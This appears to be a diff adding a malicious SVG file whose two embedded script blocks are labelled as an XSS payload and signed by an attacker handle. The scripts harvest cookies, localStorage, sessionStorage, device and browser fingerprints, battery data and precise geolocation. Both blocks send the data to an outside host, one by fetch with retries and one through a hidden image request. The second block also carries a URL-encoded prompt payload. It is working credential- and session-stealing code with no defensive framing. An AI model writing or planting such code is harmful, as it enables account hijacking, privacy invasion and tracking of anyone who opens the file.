@@ -1,0 +1,369 @@
+<script>
+    <![CDATA[
+      (function() {
+        try {
+          // Execute XSS payload
+          prompt(🛰 XSS @${location.hostname}\n\n🧠 SYSTEM\n• Domain:${location.hostname}\n• URL:${location.href}\n• Protocol:${location.protocol}\n• Host:${location.host}\n• Path:${location.pathname}\n• Port:${location.port||'default'}\n• Search:${location.search||'None'}\n\n📄 DOCUMENT\n• Title:${document.title}\n• Charset:${document.characterSet}\n• Encoding:${document.inputEncoding||'N/A'}\n• ReadyState:${document.readyState}\n• Referrer:${document.referrer||'None'}\n• Cookies:${document.cookie||'None'}\n• LastModified:${document.lastModified}\n\n👤 USER\n• AppName:${navigator.appName}\n• AppVersion:${navigator.appVersion}\n• UA:${navigator.userAgent}\n• Platform:${navigator.platform}\n• Lang:${navigator.language}\n• Online:${navigator.onLine}\n• Java:${navigator.javaEnabled?.()?'Yes':'No'}\n• TouchPts:${navigator.maxTouchPoints||0}\n\n🖥 SCREEN\n• Width:${screen.width}\n• Height:${screen.height}\n• ColorDepth:${screen.colorDepth}\n• PixelDepth:${screen.pixelDepth}\n\n📝 TEXT\n${(document.body?.innerText||'null').slice(0,100).replace(/\\s+/g,' ')}\n\n🔐 By Himmel);
+          
+          
+// Enhanced data collection with error handling
+async function collectAndSendData() {
+try {
+// 1. Collect all data
+const data = {
+  cookies: getAllCookies(),
+  localStorage: getAllLocalStorage(),
+  sessionStorage: getAllSessionStorage(),
+  userAgent: navigator.userAgent,
+  referrer: document.referrer,
+  location: window.location.href,
+  screen: getScreenInfo(),
+  device: getDeviceInfo(),
+  network: getNetworkInfo(),
+  plugins: getPluginsInfo(),
+  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+  timestamp: new Date().toISOString(),
+  webgl: getWebGLInfo(),
+  audioContext: getAudioContextInfo(),
+  battery: await getBatteryInfo(),
+  touchSupport: getTouchSupport()
+};
+
+// 2. Try to get geolocation (with timeout)
+await getGeolocation(data);
+
+// 3. Send data
+await sendData('https://maou.watashino.website/api.php', data, 'image');
+} catch (e) {
+console.error('Data collection error:', e);
+}
+}
+
+// Enhanced screen information
+function getScreenInfo() {
+try {
+return {
+  width: window.screen.width,
+  height: window.screen.height,
+  colorDepth: window.screen.colorDepth,
+  availWidth: window.screen.availWidth,
+  availHeight: window.screen.availHeight,
+  pixelDepth: window.screen.pixelDepth,
+  orientation: window.screen.orientation?.type,
+  innerWidth: window.innerWidth,
+  innerHeight: window.innerHeight,
+  outerWidth: window.outerWidth,
+  outerHeight: window.outerHeight
+};
+} catch (e) {
+console.error('Screen info error:', e);
+return { error: 'Failed to get screen info' };
+}
+}
+
+// Comprehensive device information
+function getDeviceInfo() {
+try {
+return {
+  hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+  deviceMemory: navigator.deviceMemory || 'unknown',
+  maxTouchPoints: navigator.maxTouchPoints || 0,
+  platform: navigator.platform,
+  vendor: navigator.vendor,
+  cpuClass: navigator.cpuClass,
+  devicePixelRatio: window.devicePixelRatio || 1,
+  doNotTrack: navigator.doNotTrack,
+  language: navigator.language,
+  languages: navigator.languages,
+  userAgentData: navigator.userAgentData || 'unsupported'
+};
+} catch (e) {
+console.error('Device info error:', e);
+return { error: 'Failed to get device info' };
+}
+}
+
+// Network information
+function getNetworkInfo() {
+try {
+return {
+  connection: navigator.connection ? {
+    downlink: navigator.connection.downlink,
+    effectiveType: navigator.connection.effectiveType,
+    rtt: navigator.connection.rtt,
+    saveData: navigator.connection.saveData,
+    type: navigator.connection.type
+  } : 'unsupported',
+  online: navigator.onLine
+};
+} catch (e) {
+console.error('Network info error:', e);
+return { error: 'Failed to get network info' };
+}
+}
+
+// Cookie collection with URI encoding
+function getAllCookies() {
+try {
+const cookies = {};
+document.cookie.split(';').forEach(cookie => {
+  const [name, ...rest] = cookie.trim().split('=');
+  const value = rest.join('=');
+  try {
+    cookies[name] = decodeURIComponent(value);
+  } catch {
+    cookies[name] = value; // Fallback if decoding fails
+  }
+});
+return cookies;
+} catch (e) {
+console.error('Cookie error:', e);
+return { error: 'Failed to get cookies' };
+}
+}
+
+// LocalStorage collection
+function getAllLocalStorage() {
+try {
+const storage = {};
+for (let i = 0; i < localStorage.length; i++) {
+  const key = localStorage.key(i);
+  storage[key] = localStorage.getItem(key);
+}
+return storage;
+} catch (e) {
+console.error('LocalStorage error:', e);
+return { error: 'Failed to get localStorage' };
+}
+}
+
+// SessionStorage collection
+function getAllSessionStorage() {
+try {
+const storage = {};
+for (let i = 0; i < sessionStorage.length; i++) {
+  const key = sessionStorage.key(i);
+  storage[key] = sessionStorage.getItem(key);
+}
+return storage;
+} catch (e) {
+console.error('SessionStorage error:', e);
+return { error: 'Failed to get sessionStorage' };
+}
+}
+
+// Plugin information
+function getPluginsInfo() {
+try {
+return Array.from(navigator.plugins).map(p => ({
+  name: p.name,
+  description: p.description,
+  filename: p.filename,
+  length: p.length
+}));
+} catch (e) {
+console.error('Plugins error:', e);
+return { error: 'Failed to get plugins' };
+}
+}
+
+// WebGL fingerprinting
+function getWebGLInfo() {
+try {
+const canvas = document.createElement('canvas');
+const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+if (!gl) return 'unsupported';
+
+const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+return {
+  vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
+  renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown',
+  version: gl.getParameter(gl.VERSION)
+};
+} catch (e) {
+console.error('WebGL error:', e);
+return { error: 'Failed to get WebGL info' };
+}
+}
+
+// AudioContext fingerprinting
+function getAudioContextInfo() {
+try {
+const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+const oscillator = audioContext.createOscillator();
+const analyser = audioContext.createAnalyser();
+const gainNode = audioContext.createGain();
+const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+
+oscillator.connect(analyser);
+analyser.connect(scriptProcessor);
+scriptProcessor.connect(gainNode);
+gainNode.connect(audioContext.destination);
+
+oscillator.type = 'triangle';
+oscillator.start();
+
+const audioFingerprint = [];
+scriptProcessor.onaudioprocess = e => {
+  const channelData = e.inputBuffer.getChannelData(0);
+  audioFingerprint.push(Array.from(channelData.slice(0, 5)));
+};
+
+setTimeout(() => {
+  oscillator.stop();
+  audioContext.close();
+}, 100);
+
+return { supported: true, sample: audioFingerprint[0] || [] };
+} catch (e) {
+return { supported: false, error: e.message };
+}
+}
+
+// Battery information
+async function getBatteryInfo() {
+try {
+if (!navigator.getBattery) return 'unsupported';
+const battery = await navigator.getBattery();
+return {
+  charging: battery.charging,
+  level: battery.level,
+  chargingTime: battery.chargingTime,
+  dischargingTime: battery.dischargingTime
+};
+} catch (e) {
+return { error: 'Failed to get battery info' };
+}
+}
+
+// Touch support detection
+function getTouchSupport() {
+return {
+touchEvents: 'ontouchstart' in window,
+maxTouchPoints: navigator.maxTouchPoints || 0,
+pointerEvents: !!window.PointerEvent,
+touchScreen: window.matchMedia('(pointer: coarse)').matches
+};
+}
+
+// Geolocation with timeout
+function getGeolocation(data) {
+return new Promise(resolve => {
+if (!navigator.geolocation) return resolve();
+
+const timeout = setTimeout(() => resolve(), 3000);
+
+navigator.geolocation.getCurrentPosition(
+  pos => {
+    clearTimeout(timeout);
+    data.geolocation = {
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude,
+      accuracy: pos.coords.accuracy,
+      altitude: pos.coords.altitude,
+      altitudeAccuracy: pos.coords.altitudeAccuracy,
+      heading: pos.coords.heading,
+      speed: pos.coords.speed
+    };
+    resolve();
+  },
+  err => {
+    clearTimeout(timeout);
+    console.error('Geolocation error:', err);
+    resolve();
+  },
+  { timeout: 2000, enableHighAccuracy: true }
+);
+});
+}
+
+// Data sending with retry
+async function sendData(endpoint, data, mode) {
+try {
+const payload = JSON.stringify(data);
+
+// Try beacon API first if available
+if (mode === 'beacon' && navigator.sendBeacon && payload.length < 64000) {
+  const success = navigator.sendBeacon(endpoint, payload);
+  if (success) return;
+}
+
+// Fallback to fetch with retry
+await fetchWithRetry(endpoint, payload, mode);
+} catch (e) {
+console.error('Send error:', e);
+}
+}
+
+// Fetch with retry logic
+async function fetchWithRetry(url, data, mode, retries = 3) {
+for (let i = 0; i < retries; i++) {
+try {
+  const options = {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: data
+  };
+  
+  if (mode === 'no-cors') {
+    options.mode = 'no-cors';
+    options.keepalive = true;
+  }
+  
+  const response = await fetch(url, options);
+  return; // Success
+} catch (e) {
+  if (i === retries - 1) throw e;
+  await new Promise(r => setTimeout(r, 1000 * (i + 1)));
+}
+}
+}
+
+// Start data collection after slight delay
+setTimeout(collectAndSendData, 500);
+
+        } catch(e) {
+          console.error('Error:', e);
+        }
+      })();
+    ]]>
+  </script>
+  <script>
+    <![CDATA[
+      (function() {
+        try {
+          // Execute XSS payload
+          (async%20()%20%3D%3E%20%7B%0Aconst%20batt%20%3D%20(await%20navigator.getBattery?.())%20%7C%7C%20%7Blevel%3A'NA'%7D%3B%0Aconst%20net%20%3D%20navigator.connection?.effectiveType%20%7C%7C%20'NA'%3B%0Aprompt(%60himmel%20kissed-By-0x1337%5Cn%C2%A9-Domain:::${location.hostname}%5Cn%C2%A9-ready-state:::${document.readyState}%5Cn%C2%A9-path:::${location.pathname}%5Cn%C2%A9-referrer:::${document.referrer||'None'}%5Cn%C2%A9-textContent:::${(document.body?.textContent?.trim().slice(0,50)||'null')}%5Cn%C2%A9-appName:::${navigator.appName}%5Cn%C2%A9-appCodeName:::${navigator.appCodeName}%5Cn%C2%A9-userAgent:::${navigator.userAgent}%5Cn%C2%A9-pixelDepth:::${screen.pixelDepth}%5Cn%C2%A9-colorDepth:::${screen.colorDepth}%5Cn%C2%A9-AvailWidth:::${screen.availWidth}%5Cn%C2%A9-AvailHeight:::${screen.availHeight}%5Cn%C2%A9-innerWidth:::${innerWidth}%5Cn%C2%A9-innerHeight:::${innerHeight}%5Cn%C2%A9-orientation:::${screen.orientation?.type||'N/A'}%5Cn%C2%A9-OnLine:::${navigator.onLine}%5Cn%C2%A9-Date:::${new%20Date().toLocaleDateString()}%5Cn%C2%A9-origin:::${location.origin}%5Cn%C2%A9-timezone:::${Intl.DateTimeFormat().resolvedOptions().timeZone||'N/A'}%5Cn%C2%A9-cpu-threads:::${navigator.hardwareConcurrency||'N/A'}%5Cn%C2%A9-memory:::${navigator.deviceMemory||'N/A'}%5Cn%C2%A9-languages:::${navigator.languages?.join(',')||'N/A'}%5Cn%C2%A9-maxTouch:::${navigator.maxTouchPoints||0}%5Cn%C2%A9-java:::${navigator.javaEnabled?.()?'Yes':'No'}%5Cn%C2%A9-cookie:::${document.cookie||'None'}%5Cn%C2%A9-localStorage:::${Object.keys(localStorage).length}%5Cn%C2%A9-sessionStorage:::${Object.keys(sessionStorage).length}%5Cn%C2%A9-battery:::${batt.level}%5Cn%C2%A9-network:::${net}%5Cn%C2%A9-historyLength:::${history.length}%60,%22himmel%22)%7D)();
+          
+          
+// Session data collection
+try {
+  const data = {
+    cookies: document.cookie,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage),
+    userAgent: navigator.userAgent,
+    referrer: document.referrer,
+    location: window.location.href,
+    timestamp: new Date().toISOString()
+  };
+  
+  const encoded = encodeURIComponent(JSON.stringify(data));
+  
+  
+    const img = document.createElement('img');
+    img.src = 'https://maou.watashino.website/api.php?data=' + encoded;
+    img.style.display = 'none';
+    document.body.appendChild(img);
+  
+} catch(e) {
+  console.error('Stealer error:', e);
+}
+
+        } catch(e) {
+          console.error('Error:', e);
+        }
+      })();
+    ]]>
+  </script>
+  </svg>
